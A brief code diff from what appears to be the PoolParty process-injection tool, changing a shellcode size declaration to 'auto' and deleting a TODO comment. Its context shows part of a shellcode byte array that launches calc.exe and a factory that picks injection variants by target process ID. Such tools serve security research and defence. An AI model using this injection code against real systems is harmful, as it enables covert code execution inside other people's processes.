@@ -21,7 +21,7 @@ unsigned char g_Shellcode[] =
 "\xC2\x48\x83\xEC\x20\xFF\xD6\xEB\xFE\x48\x8B\x04"
 "\x24\xC3\C:\\Windows\\System32\\calc.exe\x00";
 
-SIZE_T g_szShellcodeSize = sizeof(g_Shellcode);
+auto g_szShellcodeSize = sizeof(g_Shellcode);
 
 void PrintUsage()
 {
@@ -77,7 +77,6 @@ POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
 	return CmdArgs;
 }
 
-// TODO: Add shellcode
 std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid)
 {
 	switch (VariantId)
